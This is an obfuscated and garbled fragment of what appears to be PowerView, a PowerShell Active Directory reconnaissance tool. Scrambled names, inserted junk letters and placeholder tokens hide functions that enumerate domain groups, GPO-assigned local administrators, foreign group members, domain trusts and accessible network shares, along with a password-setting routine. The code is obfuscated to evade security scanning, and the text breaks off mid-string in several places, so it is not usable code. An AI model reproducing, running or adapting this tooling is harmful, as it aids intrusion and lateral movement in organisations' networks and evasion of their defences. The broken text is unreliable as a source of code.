    if (YoV{NaTivecalLIJKiNIJKgCOnIJKVeIJKNTioN}) { YoV{PRoPIJKEIJKRtIJKiEs}[(Z3b{3}{7}{4}{0}{5}{6}{1}{2}Z3b -f S5zeCaS5z,S5zveS5z,S5zntionS5z,S5zNS5z,S5ztivS5z,S5zllinS5z,S5zgConS5z,S5zaS5z)] = YoV{NIJKAIJKTIVIJKecaIJKLLIJKINGCOnvEnTiOn} }
    if (YoV{cIJKharSIJKeT}) { YoV{pROpIJKerTiIJKeS}[(Z3b{0}{1}Z3b-f S5zChS5z,S5zarsetS5z)] = YoV{CHarSIJKet} }
    if (YoV{SeTlASIJKTERRIJKOr}) { YoV{PRoIJKPerIJKTIeS}[(Z3b{2}{0}{1}Z3b -fS5zLastErrS5z,S5zorS5z,S5zSetS5z)] = YoV{SeTIJKlaSIJKTEIJKRrOR} }
    if (YoV{ENIJKTIJKRYPIJKOInT}) { YoV{pIJKRIJKoPeIJKRTies}[(Z3b{0}{2}{1}Z3b -f S5zEntryS5z,S5zintS5z,S5zPoS5z)] = YoV{ENIJKTrIJKYPoInT} }

    &(Z3b{1}{2}{0}Z3b -fS5zctS5z,S5zNew-OS5z,S5zbjeS5z) (Z3b{2}{1}{0}Z3b-fS5zectS5z,S5zbjS5z,S5zPSOS5z) -Property YoV{prOpIJKErTIJKIIJKEs}
}


function adIJKD-IJKWIJKin32tyIJKpe
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MandaTorY=YoV{tIJKRue}, ValUEfRoMpiPELineByPRoPeRTYnAmE=YoV{tIJKRuE})]
        [String]
        YoV{dLlIJKNIJKAme},

        [Parameter(manDAToRy=YoV{tIJKRuE}, valUEFrOmpIPEliNEBYPRopERTYNAMe=YoV{TRIJKUe})]
        [String]
        YoV{fUnCtIJKioNnIJKAIJKme},

        [Parameter(VALUEFROmpipELInebYProPErTyNAmE=YoV{TIJKRUE})]
        [String]
        YoV{enIJKTIJKRYIJKpOiNt},

        [Parameter(mANDAtorY=YoV{TIJKRUE}, vALuEfROmPipElINeBYproPerTYName=YoV{TRIJKUE})]
        [Type]
        YoV{rETuIJKRNTyIJKpe},

        [Parameter(ValuEFRomPIPelinebYprOpertYNAMe=YoV{TrIJKUE})]
        [Type[]]
        YoV{PARaIJKmeteIJKRtIJKyPes},

        [Parameter(VAluefROMPIPELINeBYproPeRtYName=YoV{TrIJKUE})]
        [Runtime.InteropServices.CallingConvention]
        YoV{NaIJKTIJKiIJKVecAlLingCIJKOIJKNveIJKNtioN} =  ( &(Z3b{1}{0}{2}Z3b-f S5zrS5z,S5zVAS5z,S5ziaBlES5z) (S5zGXS5z+S5z8S5z)  ).Z3bvIJKAlueZ3b::Z3bsTIJKDcIJKALlZ3b,

        [Parameter(ValUefrOMpIPelInebYPRoPErTyNaME=YoV{tRIJKUe})]
        [Runtime.InteropServices.CharSet]
        YoV{CHaRSIJKET} =   YoV{L2IJKQM}::Z3baIJKUtoZ3b,

        [Parameter(VALuEfRompipeLInEBypropErTynAMe=YoV{TrIJKUe})]
        [Switch]
        YoV{sEtlaIJKSIJKTeIJKRIJKRoR},

        [Parameter(manDaToRy=YoV{tIJKRUE})]
        [ValidateScript({(YoV{_} -is ','aIJKRAMIJKeteIJKRs}[(Z3b{0}{1}Z3b -f S5zFindOnS5z,S5zeS5z)]) { YoV{seAIJKRCIJKHEIJKRAIJKRguMENTs}[(Z3b{1}{0}Z3b-f S5zndOneS5z,S5zFiS5z)] = YoV{fIndoIJKNE} }
        if (YoV{pIJKSIJKBounIJKdpARamIJKeTIJKeRS}[(Z3b{3}{2}{0}{1}Z3b-f S5zdentiS5z,S5zalS5z,S5zeS5z,S5zCrS5z)]) { YoV{SeARCHeIJKRARgIJKUmIJKEntS}[(Z3b{0}{2}{1}Z3b-fS5zCS5z,S5zialS5z,S5zredentS5z)] = YoV{crIJKEDeIJKNTiIJKAl} }

        if (YoV{PIJKsbIJKOunIJKDpAIJKRametIJKers}[(Z3b{0}{1}{3}{2}Z3b-fS5zPrS5z,S5zoS5z,S5zrtiesS5z,S5zpeS5z)]) {
            YoV{pIJKROIJKpERTyFIJKiIJKlTEr} = YoV{PSIJKBOIJKUndIJKPaRaIJKMetErS}[(Z3b{0}{2}{1}Z3b -f S5zPrS5z,S5zpertiesS5z,S5zoS5z)] -Join S5zJGOS5z
        }
        else {
            YoV{PIJKRIJKOpIJKerTYfIJKiLteR} = S5zS5z
        }
    }

    PROCESS {
        if (YoV{psbIJKoUndpArIJKAMeTIJKErs}[(Z3b{2}{0}{1}Z3b -f S5zdS5z,S5zentityS5z,S5zIS5z)]) { YoV{seAIJKRIJKcIJKheIJKRargIJKUMENtS}[(Z3b{0}{1}{2}Z3b -f S5zIdS5z,S5zenS5z,S5ztityS5z)] = YoV{IdenIJKTIJKITy} }

        &(Z3b{3}{0}{1}{5}{4}{2}Z3b-f S5znS5z,S5zObS5z,S5ztS5z,S5zGet-DomaiS5z,S5z','S5zBasS5z,S5ze','gement.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKEIJKdeNtiAL} =   YoV{JIJKFi}::Z3bEMIJKPtyZ3b,

        [Switch]
        YoV{rIJKAw}
    )

    BEGIN {
        YoV{sEARIJKCheIJKRIJKAIJKRGuMENIJKTS} = @{
            (Z3b{0}{1}{2}Z3b-f S5zProS5z,S5zpertieS5z,S5zsS5z)    =   (Z3b{3}{5}{6}{4}{0}{1}{2}Z3b-f S5zeS5z,S5ztadatS5z,S5zaS5z,S5zmsds-replvS5z,S5zmS5z,S5zalS5z,S5zueS5z),(Z3b{1}{2}{0}{3}Z3b-fS5zngS5z,S5zdisS5z,S5ztiS5z,S5zuishednameS5z)
            S5zRawS5z           =   YoV{tRIJKUe}
            (Z3b{0}{1}{2}Z3b -fS5zLDS5z,S5zAPFS5z,S5zilterS5z)    =   ((Z3b{2}{4}{0}{3}{1}Z3b-fS5zbjectCategorS5z,S5z=group)S5z,S5z(S5z,S5zyS5z,S5zoS5z))
        }
        if (YoV{PSIJKBouIJKNDpIJKARIJKAmETeIJKRs}[(Z3b{2}{1}{0}Z3b-f S5znS5z,S5ziS5z,S5zDomaS5z)]) { YoV{sEAIJKRcHErIJKAIJKRgumenTs}[(Z3b{0}{2}{1}Z3b-fS5zDoS5z,S5znS5z,S5zmaiS5z)] = YoV{DIJKOmAin} }
        if (YoV{PsBOunIJKDpIJKArAMEtIJKerS}[(Z3b{2}{0}{1}Z3b -f S5zFS5z,S5zilterS5z,S5zLDAPS5z)]) { YoV{SIJKEIJKARcHERIJKARIJKGuMEnTs}[(Z3b{2}{1}{0}Z3b -f S5zerS5z,S5ztS5z,S5zLDAPFilS5z)] = YoV{LDIJKAPFIJKiIJKLTeR} }
        if (YoV{PSbIJKoUNDIJKpaRIJKAMIJKETERS}[(Z3b{2}{0}{1}Z3b -fS5zchBS5z,S5zaseS5z,S5zSearS5z)]) { YoV{SeArCheRIJKARIJKGumENIJKTS}[(Z3b{3}{1}{2}{0}Z3b-f S5zBaseS5z,S5zarS5z,S5zchS5z,S5zSeS5z)] = YoV{SeAIJKRcHIJKBaSE} }
        if (YoV{pSBIJKOIJKUndPIJKARAMeIJKTers}[(Z3b{0}{1}{2}Z3b -fS5zSeS5z,S5zrveS5z,S5zrS5z)]) { YoV{SEIJKARCHIJKERaRGIJKUIJKMeNTs}[(Z3b{2}{0}{1}Z3b -fS5zrveS5z,S5zrS5z,S5zSeS5z)] = YoV{sEIJKRIJKVer} }
        if (YoV{PsboUNIJKdPIJKARAMEtEIJKRs}[(Z3b{3}{0}{1}{2}Z3b-f S5zSS5z,S5zcoS5z,S5zpeS5z,S5zSearchS5z)]) { YoV{SIJKEARcheRAIJKRgumeIJKNIJKTS}[(Z3b{0}{1}{2}{3}Z3b-fS5zSeS5z,S5zarcS5z,S5zhScS5z,S5zopeS5z)] = YoV{sEarIJKchSCOIJKPE} }
        if (YoV{pIJKsbIJKoIJKUnIJKdIJKPARAMEters}[(Z3b{0}{1}{2}{3}Z3b -f S5zResulS5z,S5ztS5z,S5zPageSizS5z,S5zeS5z)]) { YoV{SeIJKArIJKcIJKHeIJKRIJKARGumeN','{2}{1}{5}{3}{4}Z3b -fS5zGetS5z,S5zomS5z,S5z-DS5z,S5zShS5z,S5zareS5z,S5zainDFSS5z)
&(Z3b{0}{1}Z3b-f S5zSeS5z,S5zt-AliasS5z) (Z3b{0}{2}{1}Z3b -fS5zGet-NS5z,S5zOS5z,S5zetGPS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zinGPS5z,S5zOS5z,S5zGet-S5z,S5zDomaS5z)
&(Z3b{0}{2}{1}Z3b -f S5zSet-AS5z,S5zsS5z,S5zliaS5z) (Z3b{0}{2}{3}{1}Z3b -fS5zGet-NetGS5z,S5zpS5z,S5zP','5zeS5z,S5z.LogS5z,S5zrsS5z,S5zwS5z,S5ziS5z,S5zonHouS5z))
        YoV{OutIJKPIJKUT}
    }
}


function New-adOBjecIJKTACCIJKESIJKscoNTRIJKoIJKlEIJKNIJKTry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{5}{7}{8}{2}{3}{1}{4}{9}{6}{0}Z3b -fS5zonsS5z,S5zrStS5z,S5zlS5z,S5zdProcessFoS5z,S5zateChangingFS5z,S5zPSUsS5z,S5ztiS5z,S5zeS5z,S5zShouS5z,S5zuncS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{3}{1}{0}Z3b -f S5zessS5z,S5zouldProcS5z,S5zPS5z,S5zSShS5z}, S5zS5z)]
    [OutputType({Z3b{12}{7}{8}{11}{9}{5}{4}{1}{3}{0}{10}{13}{2}{6}Z3b-f S5ztrol.AuthorizaS5z,S5zCoS5z,S5zRS5z,S5znS5z,S5zessS5z,S5zcS5z,S5zuleS5z,S5zteS5z,S5zm.Security.S5z,S5zcS5z,S5ztioS5z,S5zAS5z,S5zSysS5z,S5znS5z})]
    [CmdletBinding()]
    Param (
      ','V{cIJKoIJKMPUTersiTE} -notmatch (Z3b{1}{0}Z3b -f S5zrS5z,S5zErroS5z))) {
                    YoV{GPOIJKGIJKUids} += &(Z3b{3}{2}{4}{0}{1}Z3b-fS5zinSiS5z,S5zteS5z,S5z-DoS5z,S5zGetS5z,S5zmaS5z) @CommonArguments -Identity YoV{COIJKMputEIJKRsIIJKTe} -LDAPFilter (Z3b{0}{1}{2}Z3b-f S5z(S5z,S5zgplinS5z,S5zk=*)S5z) JGO &(Z3b{4}{0}{1}{2}{3}Z3b -fS5zrEaS5z,S5zcS5z,S5zh-ObS5z,S5zjectS5z,S5zFoS5z) {
                        &(Z3b{2}{0}{3}{1}Z3b-f S5ztS5z,S5zingS5z,S5zSelecS5z,S5z-StrS5z) -InputObject YoV{_}.Z3bgIJKPLIJKINKZ3b -Pattern S5z(5rj{){0,1}[0-9a-fA-F]{8}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{12}(5rj}){0,1}S5z -AllMatches JGO &(Z3b{1}{0}{2}Z3b -fS5zaS5z,S5zForES5z,S5zch-ObjectS5z) {YoV{_}.Z3bmaTIJKCHEsZ3b JGO &(Z3b{3}{0}{2}{1}Z3b-fS5zleS5z,S5zObjectS5z,S5zct-S5z,S5zSeS5z) -ExpandProperty (Z3b{1}{0}Z3b-f S5zueS5z,S5zValS5z) }
                    }
                }

                
                YoV{GIJKPIJKoGUIJKIdS} JGO &(Z3b{2}{1}{0}{3}{4}{5}Z3b-f S5zLS5z,S5zOS5z,S5zGet-DomainGPS5z,S5zocalGroS5z,S5zuS5z,S5zpS5z) @CommonArguments JGO &(Z3b{3}{1}{2}{0}Z3b -f S5zjectS5z,S5zort-OS5z,S5zbS5z,S5zSS5z) -Property (Z3b{0}{1}{2}Z3b -f S5zGPS5z,S5zONaS5z,S5zmeS5z) -Unique JGO &(Z3b{0}{4}{2}{3}{1}Z3b -fS5zFS5z,S5zbjectS5z,S5zrEach-S5z,S5zOS5z,S5zoS5z) {
                    YoV{GIJKpOGRoIJKUp} = YoV{_}

                    if(YoV{gpIJKOIJKgrOUp}.Z3bgRouIJKpIJKMEIJKmBERsZ3b) {
                        YoV{GpIJKOmemIJKBerS} = YoV{gPIJKOGIJKRoup}.Z3bGrIJKOUpIJKMeIJKmBerSZ3b
                    }
                    else {
                        YoV{GPIJKoIJKmEmbeIJKRS} = YoV{GpIJKoGrOUP}.Z3bGrIJKOUpIJKsIdZ3b
                    }

                    YoV{GIJKPIJKoIJKMEMbeRS} JGO &(Z3b{4}{3}{2}{1}{0}Z3b -fS5zctS5z,S5zch-ObjeS5z,S5zEaS5z,S5zorS5z,S5zFS5z) {
                        YoV{oBIJKJeIJKct} = &(Z3b{2}{0}{1}{3}Z3b-f S5zt-DomainS5z,S5zObS5z,S5zGeS5z,S5zjectS5z) @CommonArguments -Identity YoV{_}
                        YoV{IsIJKGrIJKouP} = @((Z3b{2}{1}{0}Z3b -f S5z6S5z,S5z843545S5z,S5z26S5z),(Z3b{0}{2}{1}Z3b-f S5z268S5z,S5z457S5z,S5z435S5z),(Z3b{0}{2}{1}Z3b -fS5z5S5z,S5z0912S5z,S5z3687S5z),(Z3b{2}{0}{1}Z3b -f S5z7091S5z,S5z3S5z,S5z5368S5z)) -contains YoV{oIJKBjeIJKct}.Z3bSaMIJKAcIJKCIJKOunIJKTtYpEZ3b

                        YoV{gpOIJKCOMPuteRLoIJKcaLGrIJKoIJKUpmEmBer} = &(Z3b{2}{0}{1}Z3b -fS5zecS5z,S5ztS5z,S5zNew-ObjS5z) (Z3b{0}{1}{2}Z3b-f S5zPSObjeS5z,S5zcS5z,S5ztS5z)
                        YoV{gpocoIJKmIJKputERIJKLOCIJKALGroIJKUpIJKmIJKEmIJKBEr} JGO &(Z3b{1}{3}{2}{0}Z3b -fS5zerS5z,S5zAdS5z,S5zmbS5z,S5zd-MeS5z) (Z3b{0}{2}{3}{1}Z3b-fS5zNoS5z,S5ztyS5z,S5ztepropS5z,S5zerS5z) (Z3b{0}{3}{1}{2}Z3b -f S5zComS5z,S5zeS5z,S5zrNameS5z,S5zputS5z) YoV{CIJKoMpIJKUter}.Z3bDNSHIJKoSIJKTnaMEZ3b
                        YoV{GPIJKOcIJKomPUIJKTIJKeIJKRLOcAlGroIJKUpmeMBIJKer} JGO &(Z3b{2}{0}{1}Z3b -f S5zdd-S5z,S5zMemberS5z,S5zAS5z) (Z3b{3}{0}{2}{1}Z3b -fS5zproS5z,S5zrtyS5z,S5zpeS5z,S5zNoteS5z) (Z3b{2}{1}{0}Z3b-fS5zNameS5z,S5zectS5z,S5zObjS5z) YoV{oIJKBIJKjEcT}.Z3bsaMaCCIJKoUNTNAIJKmEZ3b
                        YoV{gpIJKoCOMPUtIJKEIJKRlocaIJKlgIJKRoIJKUPIJKMEMIJKBeR} JGO &(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5zMembeS5z,S5zAdd-S5z) (Z3b{2}{0}{3}{1}Z3b-f S5zrS5z,S5ztyS5z,S5zNotepS5z,S5zoperS5z) (Z3b{1}{2}{0}Z3b -fS5zDNS5z,S5zObjeS5z,S5zctS5z) YoV{obIJKjECT}.Z3bDiStIJKINGuiShedIJKNAIJKmEZ3b
                        YoV{GpoIJKcOmPUTerLocaIJKlgRouPIJKmEmIJKBeR} JGO &(Z3b{0}{2}{1}Z3b -fS5zAdd-MemS5z,S5zrS5z,S5zbeS5z) (Z3b{0}{1}{2}Z3b -fS5zNoteS5z,S5zprS5z,S5zopertyS5z) (Z3b{1}{0}{2}Z3b -fS5zbS5z,S5zOS5z,S5zjectSIDS5z) YoV{_}
                        YoV{gpoCoMIJKputeIJKRlIJKoCALgrIJKOupMEmIJKBeR} JGO &(Z3b{1}{2}{0}Z3b-f S5zrS5z,S5zAdd-MemS5z,S5zbeS5z) (Z3b{0}{2}{1}Z3b -f S5zNS5z,S5ztepropertyS5z,S5zoS5z) (Z3b{1}{0}{2}Z3b-fS5zGS5z,S5zIsS5z,S5zroupS5z) YoV{isgrIJKOuP}
                        YoV{gpIJKoIJKcIJKOmPUtERlOCIJKALIJKGIJKRoUPMeMBEr} JGO &(Z3b{0}{3}{1}{2}Z3b-fS5zAdd-MeS5z,S5zeS5z,S5zrS5z,S5zmbS5z) (Z3b{1}{0}{3}{2}Z3b -fS5zeS5z,S5zNotS5z,S5zyS5z,S5zpropertS5z) (Z3b{0}{2}{3}{1}Z3b-f S5zGS5z,S5zayNameS5z,S5zPODiS5z,S5zsplS5z) YoV{GpIJKoGRIJKOUp}.Z3bgPIJKodIJKISIJKplAynIJKAMeZ3b
                        YoV{GpOCoIJKMIJKPUtIJKERlOIJKCALGroIJKUPIJKMEmbeR} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdS5z,S5zd-MembS5z,S5zerS5z) (Z3b{2}{1}{3}{0}Z3b-fS5zpropertyS5z,S5zotS5z,S5zNS5z,S5zeS5z) (Z3b{1}{2}{0}Z3b-f S5zdS5z,S5zGS5z,S5zPOGuiS5z) YoV{gpOGRIJKoIJKUp}.Z3bGPoNIJKAIJKmEZ3b
                        YoV{gpOIJKCOmIJKPIJKUTERLIJKocIJKAlGIJKROUPIJKmEmIJKBEr} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdS5z,S5zd-MeS5z,S5zmberS5z) (Z3b{1}{2}{0}Z3b-f S5zrtyS5z,S5zNoS5z,S5ztepropeS5z) (Z3b{0}{2}{1}Z3b-fS5zGPS5z,S5zthS5z,S5zOPaS5z) YoV{gIJKPIJKoGRoUp}.Z3bgpIJKoIJKpAThZ3b
                        YoV{GPIJKocOMPUTeRlOIJKcALgRIJKoIJKUPmeMBEr} JGO &(Z3b{1}{3}{0}{2}Z3b -f S5zemS5z,S5zAS5z,S5zberS5z,S5zdd-MS5z) (Z3b{0}{1}{2}Z3b-f S5zNS5z,S5zotepropS5z,S5zertyS5z) (Z3b{0}{1}Z3b-fS5zGPOTS5z,S5zypeS5z) YoV{GIJKpOgrIJKoup}.Z3bgIJKPOIJKTypeZ3b
                        YoV{gIJKPIJKoIJKCoMpuTERIJKlOcALGRoupIJKMeMIJKBIJKEr}.Z3bPsOBJIJKeIJKcTZ3b.Z3btyPEIJKNIJKAMEsZ3b.(Z3b{0}{1}Z3b -fS5zAdS5z,S5zdS5z).Invoke((Z3b{6}{7}{2}{5}{0}{4}{8}{3}{1}Z3b-fS5zocalGroupMS5z,S5zrS5z,S5zPOS5z,S5zeS5z,S5zemS5z,S5zComputerLS5z,S5zPowerView.S5z,S5zGS5z,S5zbS5z))
                        YoV{gIJKpOCoIJKmPUTErlocIJKALGROIJKUpmIJKEIJKMBEr}
                    }
                }
            }
        }
    }
}


function gEIJKT-IJKDoIJKMaInIJKpIJKOLIcyIJKData {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{3}{0}{1}Z3b-fS5zdS5z,S5zProcessS5z,S5zPSShoS5z,S5zulS5z}, S5z','{3}{2}{0}{1}Z3b-f S5zANS5z,S5zIZATIONS5z,S5zGS5z,S5zCROSS_ORS5z)
            [uint32](Z3b{0}{2}{1}Z3b-f S5z0xS5z,S5z00020S5z,S5z000S5z) = (Z3b{1}{2}{3}{0}Z3b-f S5zSTS5z,S5zWS5z,S5zITS5z,S5zHIN_FORES5z)
            [uint32](Z3b{0}{1}{2}Z3b -fS5z0S5z,S5zx00S5z,S5z000040S5z) = (Z3b{0}{3}{1}{2}Z3b-f S5zTREAT_S5z,S5zEXS5z,S5zTERNALS5z,S5zAS_S5z)
            [uint32](Z3b{0}{1}{2}Z3b-f S5z0x000S5z,S5z00S5z,S5z080S5z) = (Z3b{2}{0}{4}{3}{1}{5}Z3b-f S5zSES_S5z,S5zCRYPTIS5z,S5zTRUST_US5z,S5zC4_ENS5z,S5zRS5z,S5zONS5z)
            [uint32](Z3b{0}{1}{2}Z3b-f S5z0x000S5z,S5z0S5z,S5z0100S5z) = (Z3b{0}{1}{4}{2}{3}{5}Z3b-f S5zTS5z,S5zRUST_USES_S5z,S5zES_KES5z,S5zYS5z,S5zAS5z,S5zSS5z)
       ','z-WarningS5z,S5zWriS5z) (S5z[Set-S5z+S5zDS5z+S5zomainS5z+S5zUseS5z+S5zrPasS5z+S5zsS5z+S5zword]S5z+S5z S5z+S5zErrorS5z+S5z S5z+S5zsS5z+S5zetS5z+S5zting S5z+S5zpasswS5z+S5zord S5z+S5zforS5z+S5z S5z+S5zuS5z+S5zser S5z+Z3bS5zYoVIdentityS5z Z3b+S5z: S5z+Z',' YoV{i} * 8
                YoV{sIJKTr} =   (  &(Z3b{0}{1}{2}Z3b-f S5zgS5z,S5zES5z,S5zt-vARiablES5z) (S5zfOQS5z+S5zSnS5z)).Z3bVAIJKluEZ3b::(Z3b{0}{1}{2}Z3b-fS5zToSS5z,S5ztrS5z,S5zingS5z).Invoke(YoV{ByIJKTE},2).(Z3b{0}{2}{1}Z3b-f S5zPS5z,S5zeftS5z,S5zadLS5z).Invoke(8,S5z0S5z)

                YoV{loGOIJKNIJKhOUIJKRs}[YoV{oFIJKFsET}+0] = [bool]  ( &(Z3b{0}{2}{1}Z3b-f S5zvaS5z,S5zAbleS5z,S5zrIS5z)  (Z3bfOqsZ3b+Z3bNZ3b) -valUeoNl)::Z3bToInIJKTIJK32Z3b([string]YoV{SIJKTR}[7])
                YoV{loGoNIJKHOIJKURS}[YoV{oIJKFIJKFSeT}+1] = [bool]  ( &(Z3b{1}{2}{0}Z3b -fS5zIabLES5z,S5zGEt-S5z,S5zVarS5z) (Z3bFZ3b+Z3bOqsnZ3b)  -vALu  )::Z3bTIJKOiIJKNt32Z3b([string]YoV{sIJKTr}[6])
                YoV{LoGoNIJKHIJKOUIJKRs}[YoV{OFfSIJKeT}+2] = [bool]   YoV{FIJKoqsn}::Z3bTOIIJKNTIJK32Z3b([string]YoV{sIJKTR}[5])
                YoV{LIJKoIJKgoIJKNHoUrs}[YoV{oFfIJKsIJKeT}+3] = [bool]  (  &(Z3b{0}{1}Z3b -f S5zdiS5z,S5zrS5z) (S5zVAS5z+S5zrIAS5z+S5zBLeS5z+S5z:FOS5z+S5zQSNS5z)  ).Z3bValIJKUEZ3b::Z3btoIJKiIJKNT32Z3b([string]YoV{SIJKTr}[4])
                YoV{LogIJKoNhIJKouIJKRS}[YoV{OIJKFFSET}+4] = [bool]   (  &(Z3b{1}{2}{0}Z3b -fS5zeS5z','           YoV{FORIJKEIGNgRIJKOuPMIJKEIJKMBer} = &(Z3b{0}{1}{2}Z3b-f S5zNew-ObjeS5z,S5zcS5z,S5ztS5z) (Z3b{0}{1}Z3b -f S5zPSS5z,S5zObjectS5z)
                    YoV{foIJKREiGNgroIJKUPIJKmeMBer} JGO &(Z3b{1}{0}{3}{2}Z3b-f S5z-MS5z,S5zAddS5z,S5zerS5z,S5zembS5z) (Z3b{1}{0}{2}Z3b-fS5zoteprS5z,S5zNS5z,S5zopertyS5z) (Z3b{2}{1}{0}Z3b -f S5zomainS5z,S5zDS5z,S5zGroupS5z) YoV{gRIJKOUPIJKdoIJKMaIn}
                    YoV{foreIIJKGNgIJKRoIJKUpmEmbIJKER} JGO &(Z3b{2}{3}{1}{0}Z3b -f S5zmberS5z,S5zMeS5z,S5zAS5z,S5zdd-S5z) (Z3b{1}{0}{3}{2}Z3b-fS5zoS5z,S5zNoteprS5z,S5ztyS5z,S5zperS5z) (Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zpNamS5z,S5zGrouS5z) YoV{grouPIJKNIJKAme}
                    YoV{fIJKOreIIJKgngIJKRouPMIJKeMbeR} JGO &(Z3b{2}{1}{0}Z3b-fS5zerS5z,S5zbS5z,S5zAdd-MemS5z) (Z3b{1}{2}{0}Z3b-fS5zopertyS5z,S5zNotepS5z,S5zrS5z) (Z3b{1}{3}{4}{5}{0}{2}Z3b -f S5zaS5z,S5zGS5z,S5zmeS5z,S5zroupDistinguiS5z,S5zsS5z,S5zhedNS5z) YoV{gRoUPDisTIJKInGuisHeDIJKNIJKAmE}
                    YoV{FOIJKRIJKEIGIJKNGroIJKUPmEIJKMBEr} JGO &(Z3b{1}{2}{0}Z3b -f S5zerS5z,S5zAdS5z,S5zd-MembS5z) (Z3b{2}{1}{0}Z3b-fS5zrtyS5z,S5zropeS5z,S5zNotepS5z) (Z3b{2}{3}{0}{1}Z3b -fS5zerDomaiS5z,S5znS5z,S5zMS5z,S5zembS5z) YoV{MEIJKmbIJKErdOMIJKAIN}
                    YoV{fIJKoREiGngrOUIJKPmIJKEIJKmIJKBer} JGO &(Z3b{2}{1}{0}{3}Z3b -fS5zembeS5z,S5zd-MS5z,S5zAdS5z,S5zrS5z) (Z3b{2}{3}{1}{0}Z3b -fS5zertyS5z,S5zopS5z,S5zNotS5z,S5zeprS5z) (Z3b{1}{0}{2}Z3b-f S5zmberNamS5z,S5zMeS5z,S5zeS5z) YoV{MIJKEmIJKBERNIJKAMe}
                    YoV{fIJKOReIJKiIJKgnGROupMEIJKMbIJKeR} JGO &(Z3b{1}{0}{2}Z3b-fS5z-S5z,S5zAddS5z,S5zMemberS5z) (Z3b{0}{1}{2}Z3b -fS5zNotepropS5z,S5zeS5z,S5zrtyS5z) (Z3b{2}{3}{0}{1}Z3b -fS5zhedS5z,S5zNameS5z,S5zMemberDistingS5z,S5zuisS5z) YoV{mEmIJKBeIJKRDIJKiStiNGuIsIJKHeIJKDnaIJKME}
                    YoV{FOreIGNGIJKRIJKOIJKUPmemBeR}.Z3bpIJKSObJeCtZ3b.Z3btYpIJKeNamEsZ3b.(Z3b{1}{0}{2}Z3b-f S5zserS5z,S5zInS5z,S5ztS5z).Invoke(0, (Z3b{0}{5}{3}{4}{2}{1}Z3b -fS5zPowerViS5z,S5zpMemberS5z,S5zouS5z,S5zForeigS5z,S5znGrS5z,S5zew.S5z))
                    YoV{forIJKeIgNIJKGrOuIJKpIJKMeMBer}
                }
            }
        }
    }
}


function GIJKEt-DOMIJKAINTIJKRuStmAIJKppINg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{2}{0}{4}{1}Z3b -f S5zocS5z,S5zssS5z,S5zuldPrS5z,S5zPSShoS5z,S5zeS5z}, S5zS5z)]
    [OutputType({Z3b{1}{4}{2}{0}{3}Z3b -fS5zES5z,S5zPowerVS5z,S5zw.DomainTrust.NS5z,S5zTS5z,S5zieS5z})]
    [OutputType({Z3b{6}{7}{4}{5}{2}{0}{8}{3}{1}Z3b-f S5zuS5z,S5zAPS5z,S5zomainTrS5z,S5zt.LDS5z,S5zViS5z,S5zew.DS5z,S5zPowS5z,S5zerS5z,S5zsS5z})]
    [OutputTyp','}
        }
        else {
            YoV{grIJKOuP}.Z3bDIIJKspIJKlaYNAMeZ3b = YoV{CIJKontIJKExT}.Z3bIDIJKENtIJKitYZ3b
        }

        if (YoV{pSbOUIJKNDIJKPaIJKRAIJKmetERs}[(Z3b{1}{2}{3}{0}Z3b-fS5ztionS5z,S5zDesS5z,S5zcS5z,S5zripS5z)]) {
            YoV{gIJKRoIJKUP}.Z3bdEIJKScrIptIIJKOnZ3b = YoV{dEscRIJKIpTIJKIOn}
        }

        &(Z3b{0}{1}{3}{2}Z3b-f S5zWriS5z,S5zte-VeS5z,S5zoseS5z,S5zrbS5z) (S5z[New-DoS5z+S5zmaiS5z+S5znS5z+S5zGS5z+S5zroup] S5z+S5zAtS5z+S5ztemptiS5z+S5zng S5z+S5ztoS5z+S5z','JKRsEIJKArchIJKErArIJKGIJKUIJKmeNTs}[(Z3b{1}{0}{2}Z3b -f S5zearchScS5z,S5zSS5z,S5zopeS5z)] = YoV{sEIJKArCIJKhsIJKcope} }
        if (YoV{PSIJKBOuNdparAIJKmIJKetIJKERS}[(Z3b{3}{2}{1}{0}Z3b-f S5zeSizeS5z,S5zPagS5z,S5zultS5z,S5zResS5z)]) { YoV{coMpIJKUIJKTerIJKSEarChEIJKRaRGUmIJKenIJKTS}[(Z3b{3','{1}Z3b-fS5zSS5z,S5zthS5z,S5ztartsWiS5z).Invoke(S5z5rj5rjS5z)) {
                    
                    YoV{sEIJKARcIJKHIJKsHIJKArES} += YoV{TaRgETcoIJKMIJKpUIJKTER}
                }
                else {
                    YoV{Up} = &(Z3b{1}{0}{2}Z3b -fS5z-S5z,S5zTestS5z,S5zConnectionS5z) -Count 1 -Quiet -ComputerName YoV{TArgEIJKTCOIJKMpUtIJKER}
                    if (YoV{UIJKp}) {
                        
                        YoV{sHARIJKEs} = &(Z3b{2}{1}{0}Z3b -fS5zreS5z,S5zaS5z,S5zGet-NetShS5z) -ComputerName YoV{tIJKArIJKgetCIJKOMPUtIJKEr}
                        ForEach (YoV{shIJKAIJKRE} in YoV{sHIJKAres}) {
                            YoV{sIJKHAReIJKNaME} = YoV{SIJKHare}.Z3bNIJKAMEZ3b
                            YoV{pAIJKTH} = S5z5rj5rjS5z+YoV{taRIJKgETIJKCoMputeR}+S5z5rjS5z+YoV{SHIJKARIJKENaMe}
                            
                            if ((YoV{sIJKHarEnaIJKmE}) -and (YoV{shAIJKREIJKNaIJKme}.(Z3b{0}{1}Z3b-f S5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z)) {
                                
                                if (YoV{excLuDeDshIJKARIJKES} -NotContains YoV{ShAIJKRIJKeNaMe}) {
                                    
                                    try {
                                        YoV{nUIJKLl} =   YoV{zIJKcPS}::(Z3b{0}{2}{1}Z3b-fS5zGetS5z,S5zesS5z,S5zFilS5z).Invoke(YoV{pIJKAth})
                                        YoV{sEAIJKRcHShaIJKRIJKEs} += YoV{PaIJKTH}
                                    }
                                    catch {
